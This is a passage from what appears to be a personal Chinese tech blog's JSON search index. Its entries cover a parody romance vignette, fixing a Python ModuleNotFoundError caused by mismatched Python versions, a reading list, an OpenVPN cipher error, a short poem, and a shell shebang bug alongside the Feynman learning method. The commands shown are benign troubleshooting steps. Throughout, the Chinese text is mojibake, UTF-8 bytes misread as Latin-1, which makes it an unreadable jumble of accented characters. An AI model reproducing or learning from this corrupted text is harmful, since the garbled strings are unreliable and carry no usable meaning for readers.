å¼€å˜´å·´ï¼ŒæƒŠè®¶çš„çªç€æ£’æ£’ç³–ï¼Œåˆç”Ÿæ°”åˆå®³ç¾ï¼Œä»¿ä½›æ€ªè‡ªå·±ä¸è¯¥é‚£ä¹ˆé²è½ã€‚å¥¹çšç™½çš„é¢é¢Šå·²æ³›èµ·äº†æ™•æ™•ï¼Œåœ¨é˜³å…‰ä¸‹ï¼Œæ”¾ä½›æ˜¯ä¸€æœµåˆšå¼€çš„æµ·æ£ ï¼Œ å¨‡å—”é“ï¼šâ€œå“¥å“¥ï¼Œä½ å¥³æœ‹å‹è¦æ˜¯çŸ¥é“æˆ‘ä¿©åƒåŒä¸€ä¸ªæ£’æ£’ç³–ï¼Œä½ å¥³æœ‹å‹ä¸ä¼šåƒé†‹å§ï¼Ÿâ€\nâ€œå“¥å“¥ï¼Œä½ éª‘ç€å°ç”µåŠ¨è½¦ï¼Œè¿˜å¸¦ç€æˆ‘ï¼Œä½ å¥³æœ‹å‹è¦æ˜¯çŸ¥é“äº†ï¼Œä¸ä¼šæ‰“æˆ‘å§â€\nâ€œå¥½å¯æ€•ï¼ä½ å¥³æœ‹å‹ï¼â€\nå°‘å¥³ç”¨çœ¼è§’çŸç€ç”·ç”Ÿï¼Œé»¯ç„¶é“ï¼šâ€œä½ å¥³æœ‹è¿‡ä¸åƒæˆ‘ï¼Œæˆ‘åªä¼šå¿ƒç–¼å“¥å“¥ã€‚â€\n","permalink":"https://wdd.js.org/posts/2021/05/rhan2i/","summary":"ã€æˆ‘åªä¼šå¿ƒç–¼å“¥å“¥ï¼ˆåŸè§†é¢‘ï¼‰-å“”å“©å“”å“©ã€‘https://b23.tv/9YIMtp\nè“å¤©ç™½äº‘ï¼Œæ™´ç©ºä¸‡é‡Œã€‚è·¯æ—çš„ç”µçº¿æ†ç¬”æŒºçš„ç«™ç€ï¼Œæœ‰å‡ åªå°é¸Ÿï¼Œåœ¨ç”µçº¿ä¸Šè¹¦æ¥è¹¦å»ï¼Œå«ç€é—¹ç€ï¼Œç©ºæ°”ä¸­å……äº†ä»¤äººæ„‰å¿«çš„æ„Ÿè§‰ã€‚\nä¸€è¾†ç™½è‰²é›…è¿ªå† èƒ½T5çŸ³å¢¨çƒ¯72ç”µæ± å¢ç¨‹çŸ©é˜µå¼å¤§ç¯è½»ä¾¿å‹ç”µåŠ¨è½¦è‡ªåŒ—å‘å—ï¼Œç–¾é©°è€Œè¿‡ã€‚\nè½¦ä¸Šåç€ä¸€ç”·ä¸€å¥³ã€‚å°‘å¥³æ‰ç€é©¬å°¾è¾«ï¼Œæ‰‹ä¸­ä¸¾ç€ä¸€æ ¹æŠ˜å å¼æ£’æ£’ç³–ï¼Œç¬‘é¥å¦‚ç”»ï¼Œå–ƒå–ƒé“ï¼šâ€œå“¥å“¥ï¼Œå“¥å“¥ï¼Œä½ ç»™æˆ‘ä¹°è¿™ä¸ªï¼Œä½ å¥³æœ‹å‹çŸ¥é“äº†ï¼Œä¸ä¼šç”Ÿæ°”å§ï¼Ÿâ€ ä¸ç­‰ç”·ç”Ÿå›ç­”ï¼Œå¥¹è‡ªé¡¾è‡ªçš„å…ˆå°äº†ä¸€å£ã€‚ç„¶åæŠŠæ£’æ£’ç³–ä¸¾åˆ°ç”·ç”Ÿå˜´è¾¹ï¼Œç„¶åå˜»å˜»ç¬‘é“ï¼šâ€œçœŸå¥½åƒï¼Œå“¥ï¼Œä½ ä¹Ÿå°ä¸€å£â€\næ²¡æœ‰ä¸€ä¸ªäººç§è§è¿™ç”·ç”Ÿæ˜¯æ€ä¹ˆèˆ”åˆ°æ£’æ£’ç³–çš„ï¼Œä½†ä»–çš„ç¡®å°äº†ä¸€å£ã€‚\nå°‘å¥³çå¤§çœ¼ç›ï¼Œå¼ å¼€å˜´å·´ï¼ŒæƒŠè®¶çš„çªç€æ£’æ£’ç³–ï¼Œåˆç”Ÿæ°”åˆå®³ç¾ï¼Œä»¿ä½›æ€ªè‡ªå·±ä¸è¯¥é‚£ä¹ˆé²è½ã€‚å¥¹çšç™½çš„é¢é¢Šå·²æ³›èµ·äº†æ™•æ™•ï¼Œåœ¨é˜³å…‰ä¸‹ï¼Œæ”¾ä½›æ˜¯ä¸€æœµåˆšå¼€çš„æµ·æ£ ï¼Œ å¨‡å—”é“ï¼šâ€œå“¥å“¥ï¼Œä½ å¥³æœ‹å‹è¦æ˜¯çŸ¥é“æˆ‘ä¿©åƒåŒä¸€ä¸ªæ£’æ£’ç³–ï¼Œä½ å¥³æœ‹å‹ä¸ä¼šåƒé†‹å§ï¼Ÿâ€\nâ€œå“¥å“¥ï¼Œä½ éª‘ç€å°ç”µåŠ¨è½¦ï¼Œè¿˜å¸¦ç€æˆ‘ï¼Œä½ å¥³æœ‹å‹è¦æ˜¯çŸ¥é“äº†ï¼Œä¸ä¼šæ‰“æˆ‘å§â€\nâ€œå¥½å¯æ€•ï¼ä½ å¥³æœ‹å‹ï¼â€\nå°‘å¥³ç”¨çœ¼è§’çŸç€ç”·ç”Ÿï¼Œé»¯ç„¶é“ï¼šâ€œä½ å¥³æœ‹è¿‡ä¸åƒæˆ‘ï¼Œæˆ‘åªä¼šå¿ƒç–¼å“¥å“¥ã€‚â€","title":"ç”¨å¤é¾™çš„æ‰‹æ³• å†™æˆ‘åªä¼šå¿ƒç–¼å“¥å“¥"},{"content":"python3 wave.py Traceback (most recent call last): File \u0026#34;wave.py\u0026#34;, line 3, in \u0026lt;module\u0026gt; import matplotlib.pyplot as plt ModuleNotFoundError: No module named \u0026#39;matplotlib\u0026#39; è¿™ç§é—®é¢˜ä¸€èˆ¬æœ‰ä¸¤ä¸ªåŸå› \nè¿™ä¸ªç¬¬ä¸‰æ–¹çš„åŒ…æœ¬åœ°çš„ç¡®æ²¡æœ‰å®‰è£…ï¼Œè§£å†³æ–¹å¼å°±æ˜¯å®‰è£…è¿™ä¸ªåŒ… è¿™ä¸ªåŒ…å®‰è£…äº†ï¼Œä½†æ˜¯å› ä¸ºç¯å¢ƒé…ç½®æˆ–è€…å…¶ä»–é—®é¢˜ï¼Œå¯¼è‡´æ‰¾ä¸åˆ°æ­£ç¡®çš„è·¯å¾„ é—®é¢˜1: æœ¬åœ°æœ‰æ²¡æœ‰å®‰è£…è¿‡matplotlib? ä¸‹é¢çš„å‘½ä»¤çš„è¾“å‡ºè¯´æ˜å·²ç»å®‰è£…äº†matplotlib, å¹¶ä¸”ç›®å½•æ˜¯\n/usr/local/lib/python3.9/site-packages pip3 show matplotlib Name: matplotlib Version: 3.4.1 Summary: Python plotting package Home-page: https://matplotlib.org Author: John D. Hunter, Michael Droettboom Author-email: matplotlib-users@python.org License: PSF Location: /usr/local/lib/python3.9/site-packages Requires: pillow, python-dateutil, pyparsing, numpy, kiwisolver, cycler Required-by: é—®é¢˜2: python3è¿è¡Œçš„é‚£ä¸ªç‰ˆæœ¬çš„pythonï¼Ÿ ç”±äºå†å²åŸå› ï¼Œpythonçš„ç‰ˆæœ¬éå¸¸å¤šï¼Œç”µè„‘ä¸Šå¯èƒ½å®‰è£…äº†å¤šä¸ªpythonçš„ç‰ˆæœ¬ã€‚\nä¸‹é¢çš„å‘½ä»¤è¯´æ˜ï¼Œpython3å®é™…æ‰§è¡Œçš„çš„æ˜¯python 3.8.2ï¼Œæœç´¢çš„è·¯å¾„ä¹Ÿæ˜¯3.8çš„ã€‚ä½†æ˜¯pip3å®‰è£…çš„ç¬¬ä¸‰æ–¹åŒ…ï¼Œæ˜¯åœ¨python3.9çš„ç›®å½•ä¸‹ã€‚\nâœ bin python3 Python 3.8.2 (default, Dec 21 2020, 15:06:04) [Clang 12.0.0 (clang-1200.0.32.29)] on darwin Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; import sys \u0026gt;\u0026gt;\u0026gt; print(sys.path) [\u0026#39;\u0026#39;, \u0026#39;/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python38.zip\u0026#39;, \u0026#39;/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8\u0026#39;, \u0026#39;/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/lib-dynload\u0026#39;, \u0026#39;/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/site-packages\u0026#39;] âœ pip3 -V pip 21.0.1 from /usr/local/lib/python3.9/site-packages/pip (python 3.9) é—®é¢˜3: python3.9åœ¨å“ªï¼Ÿ é€šè¿‡ä¸Šé¢çš„å‘½ä»¤ï¼Œå°±è¯´äº†æˆ‘çš„ç”µè„‘ä¸Šæœ‰python3.9ï¼Œ é‚£ä¹ˆå®é™…è¦å…‹åˆ¶è¡Œæ–‡ä»¶åœ¨å“ªé‡Œå‘¢ï¼Ÿ\nä¸€èˆ¬æˆ‘æ˜¯ç”¨brewå®‰è£…è½¯ä»¶çš„ï¼Œbrew list\nbrew list - python@3.9 brew info python@3.9 Python has been installed as /usr/local/bin/python3 Unversioned symlinks `python`, `python-config`, `pip` etc. pointing to `python3`, `python3-config`, `pip3` etc., respectively, have been installed into /usr/local/opt/python@3.9/libexec/bin ä¸Šé¢çš„è¾“å‡ºä¸­ï¼Œæœ‰ä¸¤ä¸ªè·¯å¾„\n/usr/local/bin/python3 è¯•äº†ä¸‹è¿™ä¸ªè·¯å¾„æ²¡æœ‰æ–‡ä»¶ /usr/local/opt/python@3.9/libexec/bin è¿™ä¸ªæ–‡ä»¶å­˜åœ¨ âœ bin /usr/local/opt/python@3.9/libexec/bin/python -V Python 3.9.2 å°†python3 è®¾ç½®ä¸ºä¸€ä¸ªåˆ«å\nalias python3=\u0026#39;/usr/local/opt/python@3.9/libexec/bin/python\u0026#39; source ~/.zshrc\npython3 wave.py,\né—®é¢˜è§£å†³ã€‚\n","permalink":"https://wdd.js.org/posts/2021/05/blzt8r/","summary":"python3 wave.py Traceback (most recent call last): File \u0026#34;wave.py\u0026#34;, line 3, in \u0026lt;module\u0026gt; import matplotlib.pyplot as plt ModuleNotFoundError: No module named \u0026#39;matplotlib\u0026#39; è¿™ç§é—®é¢˜ä¸€èˆ¬æœ‰ä¸¤ä¸ªåŸå› \nè¿™ä¸ªç¬¬ä¸‰æ–¹çš„åŒ…æœ¬åœ°çš„ç¡®æ²¡æœ‰å®‰è£…ï¼Œè§£å†³æ–¹å¼å°±æ˜¯å®‰è£…è¿™ä¸ªåŒ… è¿™ä¸ªåŒ…å®‰è£…äº†ï¼Œä½†æ˜¯å› ä¸ºç¯å¢ƒé…ç½®æˆ–è€…å…¶ä»–é—®é¢˜ï¼Œå¯¼è‡´æ‰¾ä¸åˆ°æ­£ç¡®çš„è·¯å¾„ é—®é¢˜1: æœ¬åœ°æœ‰æ²¡æœ‰å®‰è£…è¿‡matplotlib? ä¸‹é¢çš„å‘½ä»¤çš„è¾“å‡ºè¯´æ˜å·²ç»å®‰è£…äº†matplotlib, å¹¶ä¸”ç›®å½•æ˜¯\n/usr/local/lib/python3.9/site-packages pip3 show matplotlib Name: matplotlib Version: 3.4.1 Summary: Python plotting package Home-page: https://matplotlib.org Author: John D. Hunter, Michael Droettboom Author-email: matplotlib-users@python.org License: PSF Location: /usr/local/lib/python3.9/site-packages Requires: pillow, python-dateutil, pyparsing, numpy, kiwisolver, cycler Required-by: é—®é¢˜2: python3è¿è¡Œçš„é‚£ä¸ªç‰ˆæœ¬çš„pythonï¼Ÿ ç”±äºå†å²åŸå› ï¼Œpythonçš„ç‰ˆæœ¬éå¸¸å¤šï¼Œç”µè„‘ä¸Šå¯èƒ½å®‰è£…äº†å¤šä¸ªpythonçš„ç‰ˆæœ¬ã€‚\nä¸‹é¢çš„å‘½ä»¤è¯´æ˜ï¼Œpython3å®é™…æ‰§è¡Œçš„çš„æ˜¯python 3.8.2ï¼Œæœç´¢çš„è·¯å¾„ä¹Ÿæ˜¯3.8çš„ã€‚ä½†æ˜¯pip3å®‰è£…çš„ç¬¬ä¸‰æ–¹åŒ…ï¼Œæ˜¯åœ¨python3.9çš„ç›®å½•ä¸‹ã€‚\nâœ bin python3 Python 3.","title":"python ModuleNotFoundError"},{"content":" äººç”Ÿæ˜¯ä¸€åœºä»…ä¸æ—¶é—´ä¸ºä¼´çš„å­¤ç‹¬ä¿®è¡Œ\nAã€Šé²å®¾é€Šæ¼‚æµè®°ã€‹ Bã€Šä¸€æ—¥çœ‹å°½é•¿å®‰èŠ±ã€‹ Cã€Šè¢«è®¨åŒçš„å‹‡æ°”ã€‹ Dã€Šå›´åŸã€‹ Eã€Šç‰›æ´¥é€šè¯†è¯»æœ¬ æ•°å­¦ã€‹ 5.10 11 12 13 14 15 16 17 18 19 é²æ»¨é€Šæ¼‚æµè®° 3 6 9 20 è¢«è®¨åŒçš„å‹‡æ°” 20 25 30 36 å›´åŸ 6 10 11 13 ç‰›æ´¥é€šè¯†è¯»æœ¬ æ•°å­¦ 5 8 10 19 ä¸€æ—¥çœ‹å°½é•¿å®‰èŠ± 15 20 24 35 ","permalink":"https://wdd.js.org/posts/2021/05/appxev/","summary":" äººç”Ÿæ˜¯ä¸€åœºä»…ä¸æ—¶é—´ä¸ºä¼´çš„å­¤ç‹¬ä¿®è¡Œ\nAã€Šé²å®¾é€Šæ¼‚æµè®°ã€‹ Bã€Šä¸€æ—¥çœ‹å°½é•¿å®‰èŠ±ã€‹ Cã€Šè¢«è®¨åŒçš„å‹‡æ°”ã€‹ Dã€Šå›´åŸã€‹ Eã€Šç‰›æ´¥é€šè¯†è¯»æœ¬ æ•°å­¦ã€‹ 5.10 11 12 13 14 15 16 17 18 19 é²æ»¨é€Šæ¼‚æµè®° 3 6 9 20 è¢«è®¨åŒçš„å‹‡æ°” 20 25 30 36 å›´åŸ 6 10 11 13 ç‰›æ´¥é€šè¯†è¯»æœ¬ æ•°å­¦ 5 8 10 19 ä¸€æ—¥çœ‹å°½é•¿å®‰èŠ± 15 20 24 35 ","title":"5æœˆä¹¦å•"},{"content":"2021-01-19 12:01:58 OPTIONS ERROR: failed to negotiate cipher with server. Add the server\u0026#39;s cipher (\u0026#39;BF-CBC\u0026#39;) to --data-ciphers (currently \u0026#39;AES-256-GCM:AES-128-GCM\u0026#39;) if you want to connect to this server. 2021-01-19 12:01:58 ERROR: Failed to apply push options 2021-01-19 12:01:58 Failed to open tun/tap interface è§£å†³åŠæ³•ï¼šåœ¨é…ç½®æ–‡ä»¶ä¸­å¢åŠ ä¸€è¡Œ\nncp-ciphers \u0026#34;BF-CBC\u0026#34; PSï¼š ä»Šå¤©æ˜¯æˆ‘çš„ç”Ÿæ—¥ï¼ŒQQé‚®ç®±åˆæ˜¯ç¬¬ä¸€ä¸ªå‘æ¥ç¥ç¦çš„ è‹¦ç¬‘.jpg\n","permalink":"https://wdd.js.org/posts/2021/05/kakgg7/","summary":"2021-01-19 12:01:58 OPTIONS ERROR: failed to negotiate cipher with server. Add the server\u0026#39;s cipher (\u0026#39;BF-CBC\u0026#39;) to --data-ciphers (currently \u0026#39;AES-256-GCM:AES-128-GCM\u0026#39;) if you want to connect to this server. 2021-01-19 12:01:58 ERROR: Failed to apply push options 2021-01-19 12:01:58 Failed to open tun/tap interface è§£å†³åŠæ³•ï¼šåœ¨é…ç½®æ–‡ä»¶ä¸­å¢åŠ ä¸€è¡Œ\nncp-ciphers \u0026#34;BF-CBC\u0026#34; PSï¼š ä»Šå¤©æ˜¯æˆ‘çš„ç”Ÿæ—¥ï¼ŒQQé‚®ç®±åˆæ˜¯ç¬¬ä¸€ä¸ªå‘æ¥ç¥ç¦çš„ è‹¦ç¬‘.jpg","title":"openvpn æŠ¥é”™"},{"content":"æˆ‘å°æ—¶å€™æ›¾å»è¿‡æˆéƒ½ï¼Œé‚£æ—¶å€™è¿˜æ²¡æœ‰é«˜é€Ÿå…¬è·¯ï¼Œè€Œæ˜¯ä¹æ›²å›è‚ çš„ç›˜å±±å…¬è·¯ã€‚è·¯çš„ä¸€è¾¹æ˜¯çœ‹ä¸åˆ°åº•æ‚¬å´–ï¼Œå¦ä¸€è¾¹ä¸Šæ¥è¿‘90åº¦çš„å³­å£ã€‚åœ¨å³­å£ä¹‹ä¸Šï¼Œæœ‰å¾ˆå¤šå·¨çŸ³ï¼Œæ‘‡æ‘‡æ¬²å ï¼Œååˆ†å“äººã€‚\næ·±å¤œæ—¶åˆ†ï¼Œè½¦ç¯è”“å»¶å¤„ï¼Œè¿èµ·æ¥æ”¾ä½›æ˜¯ä¸€æ¡å¤©è·¯ã€‚\nä»æˆéƒ½å›æ¥çš„æ—¶å€™ï¼Œæˆ‘å†™ä¸‹è¿™ä¸ªå°è¯—ï¼ŒåŒ†åŒ†åå¹´ï¼Œæ¡ƒèŠ±ä¾æ—§ï¼Œç‰©æ˜¯äººéã€‚æ›¾ç»æ¢¦æƒ³ä¸­çš„çš„é‚£ä¸ªé¥è¿œçš„æœªæ¥ï¼Œå·²ç„¶è¿‘åœ¨å’«å°ºã€‚ç„¶è€Œè¿™é¦–å°è¯—ï¼Œå´ä»æœªå¿˜è®°ã€‚\nç¯å…‰éšè¡€æ¶²è€ŒæµåŠ¨å¿ƒè·³ä¼´åå·è€Œèµ·ä¼æç›®è¿œçœºæƒ³çœ‹è§è·¯çš„æ—¶å€™è“¦ç„¶å›é¦–è·¯çš„å°½å¤´å¿ƒé‡Œå¤´\n","permalink":"https://wdd.js.org/posts/2021/04/gbx6x5/","summary":"æˆ‘å°æ—¶å€™æ›¾å»è¿‡æˆéƒ½ï¼Œé‚£æ—¶å€™è¿˜æ²¡æœ‰é«˜é€Ÿå…¬è·¯ï¼Œè€Œæ˜¯ä¹æ›²å›è‚ çš„ç›˜å±±å…¬è·¯ã€‚è·¯çš„ä¸€è¾¹æ˜¯çœ‹ä¸åˆ°åº•æ‚¬å´–ï¼Œå¦ä¸€è¾¹ä¸Šæ¥è¿‘90åº¦çš„å³­å£ã€‚åœ¨å³­å£ä¹‹ä¸Šï¼Œæœ‰å¾ˆå¤šå·¨çŸ³ï¼Œæ‘‡æ‘‡æ¬²å ï¼Œååˆ†å“äººã€‚\næ·±å¤œæ—¶åˆ†ï¼Œè½¦ç¯è”“å»¶å¤„ï¼Œè¿èµ·æ¥æ”¾ä½›æ˜¯ä¸€æ¡å¤©è·¯ã€‚\nä»æˆéƒ½å›æ¥çš„æ—¶å€™ï¼Œæˆ‘å†™ä¸‹è¿™ä¸ªå°è¯—ï¼ŒåŒ†åŒ†åå¹´ï¼Œæ¡ƒèŠ±ä¾æ—§ï¼Œç‰©æ˜¯äººéã€‚æ›¾ç»æ¢¦æƒ³ä¸­çš„çš„é‚£ä¸ªé¥è¿œçš„æœªæ¥ï¼Œå·²ç„¶è¿‘åœ¨å’«å°ºã€‚ç„¶è€Œè¿™é¦–å°è¯—ï¼Œå´ä»æœªå¿˜è®°ã€‚\nç¯å…‰éšè¡€æ¶²è€ŒæµåŠ¨å¿ƒè·³ä¼´åå·è€Œèµ·ä¼æç›®è¿œçœºæƒ³çœ‹è§è·¯çš„æ—¶å€™è“¦ç„¶å›é¦–è·¯çš„å°½å¤´å¿ƒé‡Œå¤´","title":"ä¸æ›¾å¿˜çš„ä¸€é¦–å°è¯—"},{"content":"ä»Šå¤©åœ¨å†™ä¸€ä¸ªshellè„šæœ¬çš„æ—¶å€™ï¼Œé‡åˆ°ä¸€ä¸ªå¥‡æ€ªçš„æŠ¥é”™ï¼Œè¯´æˆ‘çš„è„šæœ¬æœ‰è¯­æ³•é”™è¯¯ã€‚\nif [ $1 == $2 ]; then echo ok else echo not ok fi ç¼–è¯‘å™¨çš„æŠ¥é”™æ˜¯è¯´ifè¯­å¥æ˜¯æœ‰é—®é¢˜çš„ï¼Œä½†æ˜¯æˆ‘æ ¸å¯¹äº†å¥½ä¹…éï¼Œä¹Ÿçœ‹äº†ç½‘ä¸Šçš„ä¾‹å­ï¼Œå‘ç°æ²¡ä»€ä¹ˆæ¯›ç—…ã€‚\næˆ‘è‡ªå·±çœ‹äº†å‡ åˆ†é’Ÿï¼Œè¿˜æ˜¯çœ‹ä¸å‡ºæ‰€ä»¥ç„¶æ¥ã€‚ç„¶åæˆ‘å°±æ‰¾äº†ä¸€ä½åŒäº‹å¸®æˆ‘çœ‹çœ‹ï¼Œé¦–å…ˆæˆ‘ç»™ä»–è§£é‡Šäº†ä¸€éæˆ‘çš„è„šæœ¬æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œè¯´ç€è¯´ç€ï¼Œä»–è¿˜åœ¨æ€è€ƒçš„æ—¶å€™ã€‚æˆ‘çªç„¶å‘ç°ï¼Œæˆ‘çŸ¥é“åŸå› äº†ã€‚\nè¿™ä¸ªshellè„šæœ¬æ˜¯æˆ‘ä»å¦ä¸€ä¸ªè„šæœ¬é‡Œæ‹·è´çš„ã€‚è„šæœ¬çš„ç¬¬ä¸€è¡Œæ˜¯\n#!/bin/sh åŸå› å°±åœ¨ä¸ç¬¬ä¸€è¡Œçš„è¿™æ¡è¯­å¥ã€‚\nä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬éƒ½æ˜¯å†™å¾—/bin/bash, ä½†æ˜¯åœ¨æ‹·è´çš„æ—¶å€™ï¼Œæˆ‘æ²¡æœ‰è€ƒè™‘åˆ°è¿™ä¸ªã€‚å®é™…åœ¨æˆ‘çš„ç”µè„‘ä¸Š/bin/shå¾ˆå¯èƒ½ä¸æ˜¯bash, è€Œæ˜¯zshï¼Œzshçš„è¯­æ³•å’Œbashçš„è¯­æ³•æ˜¯ä¸ä¸€æ ·çš„ã€‚æ‰€ä»¥ä¼šæŠ±è¯­æ³•é”™è¯¯\n#!/bin/bash è¿™å°±æ˜¯å…¸å‹çš„ä¸€å¶éšœç›®ï¼Œä¸è§æ³°å±±ã€‚ æˆ‘è§‰å¾—æˆ‘éœ€è¦ä¹°ä¸ªå°é»„é¸­ï¼Œåœ¨é‡åˆ°çš„éš¾ä»¥è§£å†³çš„é—®é¢˜æ—¶ï¼ŒæŠ½ä¸å‰¥èŒ§çš„è§£é‡Šç»™å®ƒå¬ã€‚\nç»è¿‡è¿™ä»¶äº‹æƒ…åï¼Œæˆ‘ä¹Ÿæƒ³åˆ°äº†ä»Šå¤©åˆšå­¦åˆ°çš„ä¸€ä¸ªæ¦‚å¿µã€‚å«åšè´¹æ›¼å­¦ä¹ æ³•ï¼Œæ®è¯´æ˜¯å¾ˆç‰›é€¼çš„å­¦ä¹ æ³•ï¼Œå¯ä»¥éå¸¸å¿«çš„å­¦ä¹ ä¸€é—¨çŸ¥è¯†ã€‚\nç®€å•ä»‹ç»ä¸€ä¸‹è´¹æ›¼å­¦ä¹ æ³•ï¼š\né€‰æ‹©ä¸€ä¸ªä½ è¦å­¦å­¦ä¹ çš„æ¦‚å¿µï¼Œå†™åœ¨æœ¬å­ä¸Š å‡è£…ä½ è¦æŠŠè¿™ä¸ªæ¦‚å¿µæ•™ä¼šåˆ«äºº ä½ ä¸€å®šä¼šæŸäº›åœ°æ–¹å¡å£³çš„ï¼Œå½“ä½ å¡å£³çš„æ—¶å€™ï¼Œå°±ç«‹å³å›å»çœ‹ä¹¦ ç®€åŒ–ä½ çš„è¯­è¨€ï¼Œç›®çš„æ˜¯ç”¨ä½ è‡ªå·±çš„è¯­è¨€ï¼Œè§£é‡ŠæŸä¸ªæ¦‚å¿µï¼Œå¦‚æœä½ ä¾ç„¶è¿˜æ˜¯æœ‰äº›å›°æƒ‘ï¼Œé‚£è¯´æ˜ä½ è¿˜æ˜¯ä¸å¤Ÿäº†è§£è¿™ä¸ªæ¦‚å¿µã€‚ è´¹æ›¼æ›¾è·å¾—è¯ºè´å°”å¥–ï¼Œæ‰€ä»¥ä¸Šä»–ä¸æ˜¯ä¸ªç®€å•çš„äººã€‚è´¹æ›¼çš„è€å¸ˆå«æƒ å‹’ï¼Œè´¹æ›¼çš„å­¦ä¹ æ–¹æ³•å¾ˆå¯èƒ½æ”¶åˆ°æƒ å‹’çš„å½±å“ã€‚\næƒ å‹’å¸¸å¸¸è¯´ï¼šäººåªæœ‰æ•™åˆ«äººçš„æ—¶å€™ï¼Œæ‰èƒ½å­¦åˆ°æ›´å¤šã€‚\nAnother favorite Wheelerism is \u0026ldquo;one can only learn by teaching. æƒ å‹’ä¸»ä¹‰\næƒ å‹’è¿˜æœ‰ä¸€å¥åè¨€ï¼š\nå»æ¨å°±æ˜¯æ˜¯å­¦ä¹ ï¼Œå»å­¦ä¹ æ˜¯å»ç†è§£ï¼Œå»ç†è§£æ˜¯å»æ¬£èµï¼Œå»æ¬£èµåˆ™æ˜¯å»çˆ±ï¼Œä¹Ÿè®¸ä½ ä¼šçˆ±ä¸Šä½ çš„ç†è®ºã€‚ï¼Œ\nTo hate is to study, to study is to understand, to understand is to appreciate, to appreciate is to love. So maybe I\u0026rsquo;ll end up loving your theory. \u0026ndash; Wheeler\næ€»ä¹‹ï¼Œæˆ‘ä»¬å¦‚æœåœ¨å­¦ä¹ æ—¶èƒ½å¤ŸæŠŠçŸ¥è¯†ä¼ æˆç»™åˆ«äººï¼Œå¯¹è‡ªå·±æ¥è¯´ä¹Ÿæ˜¯ä¸€ç§å­¦ä¹ ã€‚\nå‚è€ƒ https://www.zhihu.com/question/20576786 https://baike.baidu.com/item/%E8%B4%B9%E6%9B%BC%E5%AD%A6%E4%B9%A0%E6%B3%95/50895393 https://www.quora.com/Learning-New-Things/How-can-you-learn-faster/answer/Acaz-Pereira https://www.scientificamerican.com/article/pioneering-physicist-john-wheeler-dies/ ","permalink":"https://wdd.js.org/posts/2021/04/zl6rpy/","summary":"ä»Šå¤©åœ¨å†™ä¸€ä¸ªshellè„šæœ¬çš„æ—¶å€™ï¼Œé‡åˆ°ä¸€ä¸ªå¥‡æ€ªçš„æŠ¥é”™ï¼Œè¯´æˆ‘çš„è„šæœ¬æœ‰è¯­æ³•é”™è¯¯ã€‚\nif [ $1 == $2 ]; then echo ok else echo not ok fi ç¼–è¯‘å™¨çš„æŠ¥é”™æ˜¯è¯´ifè¯­å¥æ˜¯æœ‰é—®é¢˜çš„ï¼Œä½†æ˜¯æˆ‘æ ¸å¯¹äº†å¥½ä¹…éï¼Œä¹Ÿçœ‹äº†ç½‘ä¸Šçš„ä¾‹å­ï¼Œå‘ç°æ²¡ä»€ä¹ˆæ¯›ç—…ã€‚\næˆ‘è‡ªå·±çœ‹äº†å‡ åˆ†é’Ÿï¼Œè¿˜æ˜¯çœ‹ä¸å‡ºæ‰€ä»¥ç„¶æ¥ã€‚ç„¶åæˆ‘å°±æ‰¾äº†ä¸€ä½åŒäº‹å¸®æˆ‘çœ‹çœ‹ï¼Œé¦–å…ˆæˆ‘ç»™ä»–è§£é‡Šäº†ä¸€éæˆ‘çš„è„šæœ¬æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œè¯´ç€è¯´ç€ï¼Œä»–è¿˜åœ¨æ€è€ƒçš„æ—¶å€™ã€‚æˆ‘çªç„¶å‘ç°ï¼Œæˆ‘çŸ¥é“åŸå› äº†ã€‚\nè¿™ä¸ªshellè„šæœ¬æ˜¯æˆ‘ä»å¦ä¸€ä¸ªè„šæœ¬é‡Œæ‹·è´çš„ã€‚è„šæœ¬çš„ç¬¬ä¸€è¡Œæ˜¯\n#!/bin/sh åŸå› å°±åœ¨ä¸ç¬¬ä¸€è¡Œçš„è¿™æ¡è¯­å¥ã€‚\nä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬éƒ½æ˜¯å†™å¾—/bin/bash, ä½†æ˜¯åœ¨æ‹·è´çš„æ—¶å€™ï¼Œæˆ‘æ²¡æœ‰è€ƒè™‘åˆ°è¿™ä¸ªã€‚å®é™…åœ¨æˆ‘çš„ç”µè„‘ä¸Š/bin/shå¾ˆå¯èƒ½ä¸æ˜¯bash, è€Œæ˜¯zshï¼Œzshçš„è¯­æ³•å’Œbashçš„è¯­æ³•æ˜¯ä¸ä¸€æ ·çš„ã€‚æ‰€ä»¥ä¼šæŠ±è¯­æ³•é”™è¯¯\n#!/bin/bash è¿™å°±æ˜¯å…¸å‹çš„ä¸€å¶éšœç›®ï¼Œä¸è§æ³°å±±ã€‚ æˆ‘è§‰å¾—æˆ‘éœ€è¦ä¹°ä¸ªå°é»„é¸­ï¼Œåœ¨é‡åˆ°çš„éš¾ä»¥è§£å†³çš„é—®é¢˜æ—¶ï¼ŒæŠ½ä¸å‰¥èŒ§çš„è§£é‡Šç»™å®ƒå¬ã€‚\nç»è¿‡è¿™ä»¶äº‹æƒ…åï¼Œæˆ‘ä¹Ÿæƒ³åˆ°äº†ä»Šå¤©åˆšå­¦åˆ°çš„ä¸€ä¸ªæ¦‚å¿µã€‚å«åšè´¹æ›¼å­¦ä¹ æ³•ï¼Œæ®è¯´æ˜¯å¾ˆç‰›é€¼çš„å­¦ä¹ æ³•ï¼Œå¯ä»¥éå¸¸å¿«çš„å­¦ä¹ ä¸€é—¨çŸ¥è¯†ã€‚\nç®€å•ä»‹ç»ä¸€ä¸‹è´¹æ›¼å­¦ä¹ æ³•ï¼š\né€‰æ‹©ä¸€ä¸ªä½ è¦å­¦å­¦ä¹ çš„æ¦‚å¿µï¼Œå†™åœ¨æœ¬å­ä¸Š å‡è£…ä½ è¦æŠŠè¿™ä¸ªæ¦‚å¿µæ•™ä¼šåˆ«äºº ä½ ä¸€å®šä¼šæŸäº›åœ°æ–¹å¡å£³çš„ï¼Œå½“ä½ å¡å£³çš„æ—¶å€™ï¼Œå°±ç«‹å³å›å»çœ‹ä¹¦ ç®€åŒ–ä½ 